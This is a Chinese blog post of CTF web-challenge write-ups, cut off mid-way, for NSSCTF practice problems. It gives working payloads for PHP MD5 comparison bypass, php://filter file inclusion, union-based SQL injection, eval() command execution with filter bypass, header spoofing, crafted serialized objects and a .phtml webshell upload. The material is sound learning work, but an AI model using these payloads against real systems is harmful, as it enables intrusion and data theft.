        <content type="html"><![CDATA[<h1 id="解题思路记录"><a href="#解题思路记录" class="headerlink" title="解题思路记录"></a>解题思路记录</h1><p>&emsp;&emsp;博主按NSSCTF-Web板块的顺序进行Web练习，并记录心得如下！</p><p>&emsp;&emsp;注：由于题目数量较多，篇幅过长，使用时请找到指定题目，点击目录快速到达；返回时可点击左下角<code>↑ xx%</code>按钮即回到目录</p><span id="more"></span><!-- toc --><h2 id="382-SWPUCTF-2021-新生赛-gift-F12"><a href="#382-SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="382_[SWPUCTF 2021 新生赛]gift_F12"></a>382_[SWPUCTF 2021 新生赛]gift_F12</h2><p>&emsp;&emsp;进入环境，根据题目提示，F12检查，在文本中使用<span style="background-color: yellow;">ctrl+F</span>查找关键字flag即可</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/382_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="382_结果展示"></p><h2 id="384-SWPUCTF-2021-新生赛-jicao"><a href="#384-SWPUCTF-2021-新生赛-jicao" class="headerlink" title="384_[SWPUCTF 2021 新生赛]jicao"></a>384_[SWPUCTF 2021 新生赛]jicao</h2><p>&emsp;&emsp;进入环境得到PHP代码，审查传入的两个参数“id”和“json”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$id=$_POST[&#x27;id&#x27;];                        // id需以POST方式传入</span><br><span class="line">$json=json_decode($_GET[&#x27;json&#x27;],true);   // json需以GET方式传入，且其格式需要符合json字符串格式</span><br><span class="line">if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)   // id值为&quot;wllmNB&quot;，json值为&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</span><br><span class="line">&#123;echo $flag;&#125;                            // 均正确即输出flag</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;选择Firefox，使用HackBar，加载地址后选择“Post data”，在网址后写入GET参数，在下方框中写入POST参数，点击execute执行得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/384_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="384_结果展示"></p><h2 id="386-SWPUCTF-2021-新生赛-easy-md5-–弱比较-–数组绕过"><a href="#386-SWPUCTF-2021-新生赛-easy-md5-–弱比较-–数组绕过" class="headerlink" title="386_[SWPUCTF 2021 新生赛]easy_md5 –弱比较 –数组绕过"></a>386_[SWPUCTF 2021 新生赛]easy_md5 –弱比较 –数组绕过</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计发现关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];                    <span class="comment"># 接受GET方式传入的name参数</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];           <span class="comment"># 接受POST方式传入的password参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;                           <span class="comment"># 如果两参数不同而MD5码相同，=&gt; flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>法1</strong>：通用法，数组绕过，原理是利用md5()函数无法对数组加密，当参数为数组时，md5()会直接返回null，故等式两边均为null，&#x3D;&gt; True</p><p>&emsp;&emsp;<strong>法2</strong>：适用于强比较“&#x3D;&#x3D;&#x3D;”，构造两个MD5码相同的不同字符串，构造原理是MD5码碰撞</p><p>&emsp;&emsp;<strong>法3</strong>：适用于弱比较“&#x3D;&#x3D;”，构造两个不同字符串，其MD5码<span style="background-color: yellow;">以“0e”开头且“0e”后无字母</span>；此类字符串在被用于比较或算术运算时，PHP会尝试将它们转换为数字；因为”0e”在PHP中被解释为科学计数法，且0的任何正整数次方都为0，故当两个参数的MD5码均为“0e”开头时，等式两边均为0，&#x3D;&gt; True</p><p>&emsp;&emsp;由代码易知本题为MD5码的弱比较，适用法1<span style="background-color: yellow;">(name[]&#x3D;123, password[]&#x3D;1)</span>、法3，以下给出符合法3要求的一些字符串，任意输入两个作为name和password即得到flag</p><table><thead><tr><th align="center">字符串</th><th align="center">MD5哈希值</th></tr></thead><tbody><tr><td align="center">MMHUWUV</td><td align="center">0e701732711630150438129209816536</td></tr><tr><td align="center">MAUXXQC</td><td align="center">0e478478466848439040434801845361</td></tr><tr><td align="center">IHKFRNS</td><td align="center">0e256160682445802696926137988570</td></tr></tbody></table><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/386_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="386_结果展示"></p><h2 id="427-SWPUCTF-2021-新生赛-include-–PHP伪协议-–文件包含漏洞"><a href="#427-SWPUCTF-2021-新生赛-include-–PHP伪协议-–文件包含漏洞" class="headerlink" title="427_[SWPUCTF 2021 新生赛]include –PHP伪协议 –文件包含漏洞"></a>427_[SWPUCTF 2021 新生赛]include –PHP伪协议 –文件包含漏洞</h2><p>&emsp;&emsp;根据提示传入file参数，得到PHP代码，得到flag位置：flag.php</p><p>&emsp;&emsp;由题目提示，本题知识点为文件包含漏洞，需构造PHP伪协议来获取指定文件源码，其通式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量=php://filter/read=过滤器/resource=目标文件</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;大多数情况下，过滤器使用convert.base64-encode，博主也遇到过在过滤器上做文章的题，不过本题不是</p><p>&emsp;&emsp;于是根据通式构建本题题解“变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”，得到Base64字符串</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/427_Base64%E7%A0%81%E5%B1%95%E7%A4%BA.png" title="427_Base64码展示"></p><p>&emsp;&emsp;利用在线工具进行Base64解码，得到flag：NSSCTF{3beb5044-dd5e-4c2c-828c-52e2dad60765}</p><h2 id="387-SWPUCTF-2021-新生赛-easy-sql-–字符型注入"><a href="#387-SWPUCTF-2021-新生赛-easy-sql-–字符型注入" class="headerlink" title="387_[SWPUCTF 2021 新生赛]easy_sql –字符型注入"></a>387_[SWPUCTF 2021 新生赛]easy_sql –字符型注入</h2><p>&emsp;&emsp;进入环境，根据标签页名提示，随机输入参数wllm&#x3D;1，显示信息；据题目名字可知为SQL注入，先尝试传参判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=1                  # 出现提示</span><br><span class="line">/?wllm=2                  # 提示消失</span><br><span class="line">/?wllm=1&#x27; and 1=1         # 报错</span><br><span class="line">/?wllm=1&#x27; and &#x27;1&#x27;=&#x27;1      # 显示同传入参数1一致，故为字符型注入</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;利用<span style="background-color: yellow;">“order by”</span>语句获得当前表的字段数(列数)</p><p>&emsp;&emsp;<strong>order by</strong>：根据表的第几列数据来进行表数据的排序；当然，如果列数不存在，肯定会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=1&#x27; order by 1~10          # 信息未改变，推测这里存在对1的限制</span><br><span class="line">/?wllm=2&#x27; order by 1             # 出现报错，使用--+注释后续语句</span><br><span class="line">/?wllm=2&#x27; order by 1 --+         # 信息消失，继续测试</span><br><span class="line">/?wllm=2&#x27; order by 2 --+</span><br><span class="line">/?wllm=2&#x27; order by 3 --+</span><br><span class="line">/?wllm=2&#x27; order by 4 --+         # 出现列数报错，说明表有3列</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于“select”语句特性，即<strong>当SELECT语句中包含静态值时，数据库会将这些值作为查询结果的一部分返回</strong>；结合列数，利用“union”构造语句查找回显点，即找出程序会返回表的哪几列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=2&#x27; union select 1,2,3 --+         # 得到回显点反馈如下</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_%E5%9B%9E%E6%98%BE%E7%82%B9%E5%B1%95%E7%A4%BA.png" title="387_回显点展示"></p><p>&emsp;&emsp;由图知，程序返回第2&#x2F;3列数据，据此探查数据库基本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 返回当前数据库名</span><br><span class="line">/?wllm=2&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" title="387_当前数据库名"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 返回所有数据库名</span><br><span class="line">/?wllm=2&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" title="387_所有数据库名"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 测试test_db，返回库中所有表的表名</span><br><span class="line">/?wllm=2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D.png" title="387_所有表名"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 测试两个表的所有列(字段)，找到flag位置</span><br><span class="line">/?wllm=2&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27; --+</span><br><span class="line">/?wllm=2&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_test_tb%E6%89%80%E6%9C%89%E5%88%97.png" title="387_test_tb所有列"></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_users%E6%89%80%E6%9C%89%E5%88%97.png" title="387_users所有列"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 直接查询flag</span><br><span class="line">/?wllm=2&#x27; union select 1,2,flag from test_tb --+</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/387_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="387_结果展示"></p><h2 id="424-SWPUCTF-2021-新生赛-easyrce-–eval-–命令执行函数"><a href="#424-SWPUCTF-2021-新生赛-easyrce-–eval-–命令执行函数" class="headerlink" title="424_[SWPUCTF 2021 新生赛]easyrce –eval() –命令执行函数"></a>424_[SWPUCTF 2021 新生赛]easyrce –eval() –命令执行函数</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计发现程序中使用eval()函数</p><p>&emsp;&emsp;<strong>eval()函数允许将传入的字符串作为PHP代码执行</strong>，本题即利用此点，以下是博主编文至此使用过的的eval()中使用的命令执行函数</p><table><thead><tr><th align="center">命令执行函数</th><th align="center">参数说明</th><th align="center">使用效果</th></tr></thead><tbody><tr><td align="center">system()</td><td align="center">传入一个shell语句字符串</td><td align="center">直接返回shell语句运行结果</td></tr><tr><td align="center">$x &#x3D; popen()</td><td align="center">第一个参数为路径，第二个参数为模式(r、w)</td><td align="center">以读写模式打开一个到外部命令的管道，并返回</td></tr><tr><td align="center">exec()</td><td align="center">传入一个shell语句字符串</td><td align="center">执行语句但不返回结果</td></tr></tbody></table><p>&emsp;&emsp;先通过system()来尝试获取目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/424_%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" title="424_目录结构"></p><p>&emsp;&emsp;直接读取flag所处文件，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/424_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="424_结果展示"></p><h2 id="383-SWPUCTF-2021-新生赛-caidao-–同424"><a href="#383-SWPUCTF-2021-新生赛-caidao-–同424" class="headerlink" title="383_[SWPUCTF 2021 新生赛]caidao –同424"></a>383_[SWPUCTF 2021 新生赛]caidao –同424</h2><p>&emsp;&emsp;做法完全同424，只需要以POST方式传入参数wllm，省略</p><h2 id="3861-LitCTF-2023-我Flag呢？"><a href="#3861-LitCTF-2023-我Flag呢？" class="headerlink" title="3861_[LitCTF 2023]我Flag呢？"></a>3861_[LitCTF 2023]我Flag呢？</h2><p>&emsp;&emsp;做法完全同382，按F12搜索flag关键字即可，省略</p><h2 id="385-SWPUCTF-2021-新生赛-Do-you-know-http-–HTTP浏览器修改-–HTTP请求IP更改"><a href="#385-SWPUCTF-2021-新生赛-Do-you-know-http-–HTTP浏览器修改-–HTTP请求IP更改" class="headerlink" title="385_[SWPUCTF 2021 新生赛]Do_you_know_http –HTTP浏览器修改 –HTTP请求IP更改"></a>385_[SWPUCTF 2021 新生赛]Do_you_know_http –HTTP浏览器修改 –HTTP请求IP更改</h2><p>&emsp;&emsp;进入环境得到提示，结合题目，使用BurpSuite对HTTP数据包进行抓取并修改，以下为关键数据的按行解读</p><table><thead><tr><th align="center">行号</th><th align="center">请求信息</th><th align="center">解读</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">GET &#x2F;hello.php HTTP&#x2F;1.1</td><td align="center">这是一个GET请求，请求的资源是&#x2F;hello.php，使用的HTTP版本是1.1</td></tr><tr><td align="center">2</td><td align="center">Host:</td><td align="center">请求的目标主机和端口号</td></tr><tr><td align="center">3</td><td align="center">Accept-Language:</td><td align="center">请求者希望服务器返回的语种</td></tr><tr><td align="center">4</td><td align="center">User-Agent:</td><td align="center">请求者的用户代理信息，包括操作系统、浏览器类型和版本号等</td></tr><tr><td align="center">5</td><td align="center">Accept:</td><td align="center">请求者可以接受的媒体类型</td></tr><tr><td align="center">6</td><td align="center">Accept-Encoding:</td><td align="center">请求者可以接受的内容编码类型</td></tr></tbody></table><p>&emsp;&emsp;题目要求使用WLLM浏览器，故修改“User-Agent”信息头的信息为WLLM，得到Response信息如下</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/385_WLLMresponse.png" alt=" " title="385_WLLMresponse"></p><p>&emsp;&emsp;观察到Location信息头返回了一个新的.php文件，访问</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/385_a.php%E8%AE%BF%E9%97%AE.png" title="385_a.php访问"></p><p>&emsp;&emsp;根据提示，需要在“local”，也就是主机本地才能访问得到下一步提示，故需修改客户端IP为127.0.0.1</p><p>&emsp;&emsp;网上查阅得知，<strong>指定请求方真实IP的方式：添加信息头X-Forwarded-For</strong></p><p>&emsp;&emsp;<strong>附：X-Forwarded-For: client1, proxy1, proxy2, …</strong></p><table><thead><tr><th align="center">参数名</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">client</td><td align="center">客户端的真实IP地址</td></tr><tr><td align="center">proxy</td><td align="center">经过的代理或负载均衡器的IP地址</td></tr></tbody></table><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/385_IP%E4%BF%AE%E6%94%B9.png" title="385_IP修改"></p><p>&emsp;&emsp;进入新给出的.php文件，得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/385_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="385_结果展示"></p><h2 id="425-SWPUCTF-2021-新生赛-babyrce-–空格绕过-–-绕过-–命令执行函数"><a href="#425-SWPUCTF-2021-新生赛-babyrce-–空格绕过-–-绕过-–命令执行函数" class="headerlink" title="425_[SWPUCTF 2021 新生赛]babyrce –空格绕过 –&#x2F;绕过 –命令执行函数"></a>425_[SWPUCTF 2021 新生赛]babyrce –空格绕过 –&#x2F;绕过 –命令执行函数</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计发现要求修改cookie，输入admin&#x3D;1，利用HackBar完成，execute执行后得到提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/425_%E6%96%B0%E6%96%87%E4%BB%B6%E6%8F%90%E7%A4%BA.png" title="425_新文件提示"></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/425_%E6%96%B0PHP%E4%BB%A3%E7%A0%81.png" title="425_新PHP代码"></p><p>&emsp;&emsp;进入新的.php文件，审计代码发现命令执行函数shell_exec()，其将结果存于变量中，再输出该变量</p><p>&emsp;&emsp;审计代码还能发现程序将空格与斜杠符”&#x2F;“屏蔽，故需要绕过，这里学到的是通过url编码字符进行绕过，查阅知</p><table><thead><tr><th align="center">字符</th><th align="center">URL编码</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%09</td></tr><tr><td align="center">&#x2F;</td><td align="center">%2f</td></tr></tbody></table><p>&emsp;&emsp;故构造shell语句传入参数url中，获取基础信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 获取目录结构</span><br><span class="line">/rasalghul.php?url=ls%09%2f</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/425_%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" title="425_目录结构"></p><p>&emsp;&emsp;利用cat命令输出目标文件，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 输出目标文件</span><br><span class="line">/rasalghul.php?url=cat%09%2fflllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/425_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="425_结果展示"></p><h2 id="344-第五空间-2021-WebFTP-–目录扫描-–phpinfo"><a href="#344-第五空间-2021-WebFTP-–目录扫描-–phpinfo" class="headerlink" title="344_[第五空间 2021]WebFTP –目录扫描 –phpinfo()"></a>344_[第五空间 2021]WebFTP –目录扫描 –phpinfo()</h2><p>&emsp;&emsp;进入环境，无明显提示，F12搜素关键字也无果，对两个输入框初步尝试仍然没有头绪，扫描目录(自己写了个，练练手ʕ ᵔᴥᵔ ʔ)发现线索</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/344_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="344_目录扫描结果"></p><p>&emsp;&emsp;结果显示有两个关键文件存在，先查看phpinfo.php，ctrl+F搜索flag关键字得到答案</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/344_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="344_结果展示"></p><h2 id="426-SWPUCTF-2021-新生赛-ez-unserialize-–反序列化-–对象反序列化字串解读"><a href="#426-SWPUCTF-2021-新生赛-ez-unserialize-–反序列化-–对象反序列化字串解读" class="headerlink" title="426_[SWPUCTF 2021 新生赛]ez_unserialize –反序列化 –对象反序列化字串解读"></a>426_[SWPUCTF 2021 新生赛]ez_unserialize –反序列化 –对象反序列化字串解读</h2><p>&emsp;&emsp;进入环境，欣赏半分钟胡桃摇，无果，开始扫描目录 &#x3D;&gt; 嗯？这么快？</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/426_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="426_目录扫描结果"></p><p>&emsp;&emsp;对两个关键文件都进行搜索，flag.php为空，robots.txt给出了提示信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /cl45s.php</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;进入提示.php文件，得到PHP代码，行，没见过反序列化，开始学，以下是据本题所学到的对象序列化字串的格式及解读，日后的日后再说</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/426_PHP%E4%BB%A3%E7%A0%81%E5%B1%95%E7%A4%BA.png" title="426_PHP代码展示"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例</span></span><br><span class="line">?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">字符</th><th align="center">解读</th></tr></thead><tbody><tr><td align="center">O:</td><td align="center">表示序列化的元素是对象</td></tr><tr><td align="center">4:</td><td align="center">表示对象的类名为4个字符</td></tr><tr><td align="center">“test”:</td><td align="center">对象的类名</td></tr><tr><td align="center">2:</td><td align="center">表示对象有两个属性</td></tr><tr><td align="center">s:</td><td align="center">第一个属性名，肯定是字符型</td></tr><tr><td align="center">4:</td><td align="center">第一个属性名有4个字符</td></tr><tr><td align="center">“ * a”;</td><td align="center">第一个属性名(见注)</td></tr><tr><td align="center">s:</td><td align="center">第一个属性值的类型</td></tr><tr><td align="center">9:</td><td align="center">第一个属性值有9个字符</td></tr><tr><td align="center">“xiaoshizi”;</td><td align="center">第一个属性值</td></tr><tr><td align="center">s:</td><td align="center">第二个属性名类型</td></tr><tr><td align="center">7:</td><td align="center">第二个属性有7个字符</td></tr><tr><td align="center">“ test b”;</td><td align="center">第二个属性名(见注)</td></tr><tr><td align="center">s:</td><td align="center">第二个属性值为字符型</td></tr><tr><td align="center">8:</td><td align="center">有8个字符</td></tr><tr><td align="center">“laoshizi”;</td><td align="center">第二个属性值</td></tr></tbody></table><p>&emsp;&emsp;<span style="background-color: red;">注：</span>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code></p><p>&emsp;&emsp;学完了，再来看题，很明显，以GET方式传入一个序列化字串做参数p即可，手拿把掐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 序列化元素为对象，类名为wllm，有两个属性</span><br><span class="line">O:4:&quot;wllm&quot;:2:&#123;&#125;</span><br><span class="line"># 第一个属性值为admin才可通过</span><br><span class="line">s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;</span><br><span class="line"># 第一个属性值为ctf才可通过</span><br><span class="line">s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;</span><br><span class="line"># 连起来</span><br><span class="line">O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;传入参数后得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/426_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="426_结果展示"></p><h2 id="423-SWPUCTF-2021-新生赛-easyupload2-0-–文件上传-–文件后缀绕过"><a href="#423-SWPUCTF-2021-新生赛-easyupload2-0-–文件上传-–文件后缀绕过" class="headerlink" title="423_[SWPUCTF 2021 新生赛]easyupload2.0 –文件上传 –文件后缀绕过"></a>423_[SWPUCTF 2021 新生赛]easyupload2.0 –文件上传 –文件后缀绕过</h2><p>&emsp;&emsp;进入环境，拔剑四顾心茫然ヽ(゜Q。)ノ？，看题目名字，得，先学吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 原理：用户上传可执行脚本文件对整个网站甚至服务器进行控制，这个脚本又叫Webshell</span><br><span class="line"># 一句话木马示例</span><br><span class="line">&lt;?php @eval(~);?&gt;       # @用于抑制eval函数的报错，~中填写PHP代码</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;本地编个.php文件试试看：<code>&lt;?php @eval (system(&quot;ls /&quot;)); ?&gt;</code>，结果返还提示：php是不行滴，看来是被限制了</p><p>&emsp;&emsp;查阅得知，.php文件还可以修改为<span style="background-color: yellow;">.phtml(含PHP代码的.html文件)</span>后缀且不影响功能，用BurpSuite抓包改一下，出现提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/423_%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png" title="423_抓包修改结果"></p><p>&emsp;&emsp;进入提示.phtml文件，得到命令执行函数的运行结果</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/423_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png" title="423_命令执行结果"></p><p>&emsp;&emsp;没有思路，决定先理清目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令：pwd</span><br><span class="line">&lt;?php @eval(system(&quot;pwd&quot;);?&gt;          # 返回：/app/upload</span><br><span class="line"># 执行命令：ls /app</span><br><span class="line">&lt;?php @eval(system(&quot;ls /app&quot;);?&gt;      # 返回：flag.php index.php upload 